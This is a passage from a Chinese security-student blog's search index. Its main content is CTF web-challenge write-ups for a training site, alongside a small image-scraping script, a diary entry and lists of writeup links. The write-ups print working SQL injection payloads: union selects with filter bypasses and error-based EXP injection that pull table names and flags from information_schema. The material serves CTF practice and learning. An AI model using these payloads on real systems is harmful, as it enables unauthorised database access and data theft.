<span class="attribute">value</span>=0&gt;</span><br><span class="line">修改<span class="attribute">value</span>=1</span><br></pre></td></tr></table></figure><ul><li>Guess Next Session</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">清除cookie就行了</span><br></pre></td></tr></table></figure><ul><li>拐弯抹角</li></ul><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">考点: 伪静态</span><br><span class="line">构造<span class="keyword">index</span>.php/inedx.php</span><br></pre></td></tr></table></figure><ul><li>让我进去</li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">考点: Hash拓展长度攻击原理</span></span><br></pre></td></tr></table></figure><ul><li>天下武功唯快不破</li></ul><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> 查看源码发现:</span><br><span class="line"> &lt;!-- please post what you find with <span class="keyword">parameter</span>:key <span class="comment">--&gt;</span></span><br><span class="line"> 在返回报文看到flag,提交发现失败,于是写刷新发现flag在变,利用脚本进行提交:</span><br><span class="line"> import <span class="comment">requests</span></span><br><span class="line">import <span class="comment">base64</span></span><br><span class="line">url <span class="comment">=</span> <span class="comment">'http://ctf5.shiyanbar.com/web/10/10.php'</span></span><br><span class="line"></span><br><span class="line">s <span class="comment">= requests.get(url)</span></span><br><span class="line"></span><br><span class="line">flag <span class="comment">= base64.b64decode((s.headers[</span><span class="comment">'FLAG'</span><span class="comment">]))</span></span><br><span class="line">f <span class="comment">= flag.decode()</span></span><br><span class="line"># print <span class="comment">(f.split(</span><span class="comment">':'</span><span class="comment">))</span></span><br><span class="line">f1 <span class="comment">= f.split(</span><span class="comment">':'</span><span class="comment">)[1]</span></span><br><span class="line"># print(flag)</span><br><span class="line">print(f1)</span><br><span class="line">f1 <span class="comment">= &#123;</span><span class="comment">'key'</span><span class="comment">:f1&#125;</span></span><br><span class="line">r <span class="comment">= requests.post(url,data=f1)</span></span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><ul><li>简单的sql注入</li></ul><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入<span class="number">1</span>' or '<span class="number">1</span>'='<span class="number">1</span></span><br><span class="line">爆出全部</span><br><span class="line"><span class="number">1</span>'  unionunion  selectselect  database()'</span><br><span class="line"><span class="number">1</span>'  unionunion  selectselect  flag  fromfrom  flag  wherewhere  '<span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li>简单的sql注入之2</li></ul><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">测试<span class="keyword">select</span></span><br><span class="line">存在sql注入</span><br><span class="line">sel%<span class="number">0</span>aect绕过成功</span><br><span class="line">id=<span class="number">1</span><span class="symbol">'union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>'  //成功回显</span><br><span class="line">id=<span class="number">1</span><span class="symbol">'union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>database()' //database() 被过滤</span><br><span class="line">http://ctf5.shiyanbar.com/web/index_2.php?id=<span class="number">1</span><span class="symbol">'union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>table_name<span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span>where<span class="comment">/**/</span><span class="string">'1'</span>='<span class="number">1</span></span><br><span class="line">id=<span class="number">1</span><span class="symbol">'union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>column_name<span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span>where<span class="comment">/**/</span>table_name=<span class="symbol">'flag</span></span><br><span class="line">id=<span class="number">1</span>%<span class="number">27</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>flag<span class="comment">/**/</span>from<span class="comment">/**/</span>flag%<span class="number">23</span></span><br></pre></td></tr></table></figure><ul><li>简单的sql注入之3</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EXP报错</span><br><span class="line">http://ctf5.shiyanbar.com/web/index_3.php?id=1'or exp(~(<span class="keyword">Select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">database</span>())x)) %<span class="number">23</span></span><br><span class="line"><span class="keyword">http</span>://ctf5.shiyanbar.com/web/index_3.php?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'or exp(~(Select * from (select group_concat(table_name) from information_schema.tables where table_schema=database())x)) %23</span></span><br><span class="line"><span class="string">http://ctf5.shiyanbar.com/web/index_3.php?id=1'</span><span class="keyword">or</span> <span class="keyword">exp</span>(~(<span class="keyword">Select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'flag'</span>)x)) %<span class="number">23</span></span><br><span class="line"><span class="keyword">http</span>://ctf5.shiyanbar.com/web/index_3.php?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'or exp(~(Select * from (select group_concat(flag) from flag)x)) %23</span></span><br></pre></td></tr></table></figure><ul><li>因缺思汀的绕过</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>实战利用py爬取图片</title>
      <link href="/2018/12/07/%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8py%E7%88%AC%E5%8F%96%E5%9B%BE%E7%89%87/"/>
      <url>/2018/12/07/%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8py%E7%88%AC%E5%8F%96%E5%9B%BE%E7%89%87/</url>
      
        <content type="html"><![CDATA[<h1 id="记第一次写爬虫"><a href="#记第一次写爬虫" class="headerlink" title="记第一次写爬虫"></a>记第一次写爬虫</h1><p>作为只回看懂代码的我,今玩要自己动手写一次爬虫,以前看过<strong>BeautifulSoup</strong>和<strong>requests</strong>库的一些用法,现在要自己写一个,花了我一个晚上的时间,结果写完也只有十几行的代码,难受受,看着自己写的十几行辣鸡代码,看来自己以后得好好自己动手写代码了.</p><h3 id="实战爬取图片"><a href="#实战爬取图片" class="headerlink" title="实战爬取图片"></a>实战爬取图片</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">'https://mp.weixin.qq.com/s/_ejalkc-Dg-YsFEXfVNpVw'</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url)</span><br><span class="line"></span><br><span class="line">html = response.text</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(html,<span class="string">'html.parser'</span>)</span><br><span class="line"></span><br><span class="line">dd = soup.find_all(<span class="string">'img'</span>,attrs=&#123;<span class="string">'data-src'</span>:<span class="keyword">True</span>&#125;) <span class="comment"># 找到属性值(即图片地址)</span></span><br><span class="line">b=[]  <span class="comment">#建一个列表放图片地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> img <span class="keyword">in</span> dd:</span><br><span class="line">    b.append(img.attrs[<span class="string">'data-src'</span>]) <span class="comment">#将获取的地址放到列表中,我也不知道自己为什么脑残这么做</span></span><br><span class="line">x=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> imgurl <span class="keyword">in</span> b:</span><br><span class="line">    urllib.urlretrieve(imgurl,<span class="string">'%s.jpg'</span>%x)  <span class="comment">#感觉用requests来编写下载的代码好麻烦就用urllib了 (逃~</span></span><br><span class="line">    x = x + <span class="number">1</span></span><br></pre></td></tr></table></figure><p>菜鸡又得自闭了 ==</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>有点小情绪</title>
      <link href="/2018/11/24/%E6%97%A5%E8%AE%B0/"/>
      <url>/2018/11/24/%E6%97%A5%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="今天出太阳了-最舒服"><a href="#今天出太阳了-最舒服" class="headerlink" title="今天出太阳了,最舒服!"></a>今天出太阳了,最舒服!</h2><p>11月好多CTF比赛鸭~ 我这种菜鸡做一道题都要花一个下午或者一个晚上很是难受,比赛和平常的刷题有区别,平常刷题不会就看writeup,hhhhh~<br>明显是自己比赛题目做少了,经验不多,学的东西不是很多,感觉自己学的都是表面的东西,现在学的知识漏洞及利用都是好几年前的知识,现在想找漏洞真的太难了。<br>有时候这题看freebuf时候有些看都看不懂,就有点想放弃了,想从开发开始做起,今天换了几本过期的书又借了两本python的书,想把自己的python提升,做些小程序出来,好让自己有成就感<br>加油~<br>少说话的，多做事，要自信！做好自己！  （逃~</p>]]></content>
      
      
      <categories>
          
          <category> 日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日记 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>文件上传漏洞总结</title>
      <link href="/2018/11/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2018/11/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传漏洞总结"><a href="#文件上传漏洞总结" class="headerlink" title="文件上传漏洞总结"></a>文件上传漏洞总结</h1><h5 id="做过很多文件上传漏洞-感觉不难-但是比赛有些还是不会-明明是一个很简单的知识点-还要想半天-现在来总结一下-让自己的思路清晰点-系统化-日常更新！"><a href="#做过很多文件上传漏洞-感觉不难-但是比赛有些还是不会-明明是一个很简单的知识点-还要想半天-现在来总结一下-让自己的思路清晰点-系统化-日常更新！" class="headerlink" title="做过很多文件上传漏洞,感觉不难,但是比赛有些还是不会,明明是一个很简单的知识点,还要想半天,现在来总结一下,让自己的思路清晰点,系统化,日常更新！"></a>做过很多文件上传漏洞,感觉不难,但是比赛有些还是不会,明明是一个很简单的知识点,还要想半天,现在来总结一下,让自己的思路清晰点,系统化,日常更新！</h5><p>因为很多图片,懒得放在图床里面,所以放在csdn或者博客园里面<br><a href="https://blog.csdn.net/qq_30464257/article/details/84404229#%E8%83%BD%E8%A2%AB%E8%A7%A3%E6%9E%90%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%88%97%E8%A1%A8%EF%BC%9Ajsp%20jspx%20jspfasp%20asa%20cer%20aspxphp%20php%20php3%20php4exe%20exee" target="_blank" rel="noopener">文件上传漏洞总结</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>湖湘杯WP</title>
      <link href="/2018/11/21/2018%E6%B9%96%E6%B9%98%E6%9D%AFWP/"/>
      <url>/2018/11/21/2018%E6%B9%96%E6%B9%98%E6%9D%AFWP/</url>
      
        <content type="html"><![CDATA[<h1 id="湖湘杯初赛没过-只能复现了QAQ"><a href="#湖湘杯初赛没过-只能复现了QAQ" class="headerlink" title="湖湘杯初赛没过 只能复现了QAQ"></a>湖湘杯初赛没过 只能复现了QAQ</h1>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>恒安杯历年WP</title>
      <link href="/2018/11/21/%E6%81%92%E5%AE%89%E6%9D%AF%E5%8E%86%E5%B9%B4WP/"/>
      <url>/2018/11/21/%E6%81%92%E5%AE%89%E6%9D%AF%E5%8E%86%E5%B9%B4WP/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="一月"><a href="#一月" class="headerlink" title="一月"></a>一月</h1><p><code>https://blog.csdn.net/luojiabin135/article/details/79638689</code><br><code>https://www.jianshu.com/p/abc44c54857a</code><br><code>http://rui0.cn/archives/763</code></p><h1 id="二月"><a href="#二月" class="headerlink" title="二月"></a>二月</h1><h1 id="三月"><a href="#三月" class="headerlink" title="三月"></a>三月</h1><p><code>https://coxxs.me/642</code><br><code>http://www.itdaan.com/blog/2018/03/26/acc9c32fda6f0e56651cc1322b43cf36.html</code></p><h1 id="五月"><a href="#五月" class="headerlink" title="五月"></a>五月</h1><p><code>https://blog.csdn.net/m0_38094687/article/details/80387188?utm_source=blogkpcl1</code></p><h1 id="六月"><a href="#六月" class="headerlink" title="六月"></a>六月</h1><p><code>https://blog.csdn.net/u011377996/article/details/80787236?utm_source=blogkpcl2</code></p><h1 id="八月"><a href="#八月" class="headerlink" title="八月"></a>八月</h1><p><code>https://www.jianshu.com/p/0da0312cd1fd</code></p><h1 id="九月"><a href="#九月" class="headerlink" title="九月"></a>九月</h1><p><code>https://www.anquanke.com/post/id/160582?from=singlemessage</code></p><h1 id="十月"><a href="#十月" class="headerlink" title="十月"></a>十月</h1><p><code>https://www.jianshu.com/p/e1af7cc3483d</code></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>CTF</title>
      <link href="/2018/11/21/CTF/"/>
      <url>/2018/11/21/CTF/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><pre><code>筱阳QQ：1260457781</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
